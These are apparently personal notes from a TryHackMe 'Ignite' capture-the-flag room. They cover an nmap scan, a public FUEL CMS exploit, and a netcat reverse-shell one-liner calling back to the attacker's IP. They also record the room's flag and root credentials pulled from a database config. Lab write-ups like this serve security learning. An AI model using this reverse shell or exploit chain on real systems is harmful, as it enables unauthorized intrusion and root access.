# Matheus Jesus 04-04-2020

## Try Hack Me - Ignite (https://tryhackme.com/room/ignite)

### Ref (https://unicornsec.com/home/tryhackme-ignite)

### IP 10.10.214.229

### Net scan

nmap -sC -sV -oN nmap_initial 10.10.214.229

port 80 open

### Exploit DB

https://www.exploit-db.com/exploits/47138

* Download the Exploit
* Edit it (IP)
* Execute and write commands to be ran on the server

### NC Netcat

On Local
nc -nlvp 1337

On remote
rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.9.5.234 1337 >/tmp/f

#### Commands to be ran on the reverse shell

* cd /home/www-data
* ls
* cat flag.txt (6470e394cbf6dab6a91682cc8585059b)

#### Spawn TTY (To access Root)

On local NC:
python -c 'import pty; pty.spawn("/bin/bash")'

#### Privilege Escalation

The http://10.10.214.229:80 says:

Install the FUEL CMS database by first creating the database in MySQL and then importing the fuel/install/fuel_schema.sql file. After creating the database, change the database configuration found in fuel/application/config/database.php to include your hostname (e.g. localhost), username, password and the database to match the new database you created.

##### Commands

* locate database.php (/var/www/html/fuel/application/config/database.php)
* cat database.php

```php
 $db['default'] = array(
'dsn' => '',
'hostname' => 'localhost',
'username' => 'root',
'password' => 'mememe',
'database' => 'fuel_schema',
'dbdriver' => 'mysqli',
'dbprefix' => '',
'pconnect' => FALSE,
'db_debug' => (ENVIRONMENT !== 'production'),
'cache_on' => FALSE,
'cachedir' => '',
'char_set' => 'utf8',
'dbcollat' => 'utf8_general_ci',
'swap_pre' => '',
'encrypt' => FALSE,
'compress' => FALSE,
'stricton' => FALSE,
'failover' => array(),
'save_queries' => TRUE
);
```

#### root password is HARDCODED

DONE!
